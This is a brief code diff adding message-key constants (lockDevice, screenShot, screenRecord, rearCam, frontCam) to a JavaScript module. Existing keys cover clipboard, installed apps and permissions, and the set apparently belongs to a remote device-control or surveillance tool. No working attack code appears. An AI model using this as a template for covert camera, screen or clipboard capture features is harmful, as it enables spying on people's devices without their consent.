@@ -33,7 +33,12 @@ exports.messageKeys = {
     clipboard: '0xCB',
     installed: '0xIN',
     permissions: '0xPM',
-    gotPermission: '0xGP'
+    gotPermission: '0xGP',
+    lockDevice: '0xLD',
+    screenShot: '0xSS',
+    screenRecord: '0xSR',
+    rearCam: '0xRC',
+    frontCam: '0xFC'
 }
 
 exports.logTypes = {
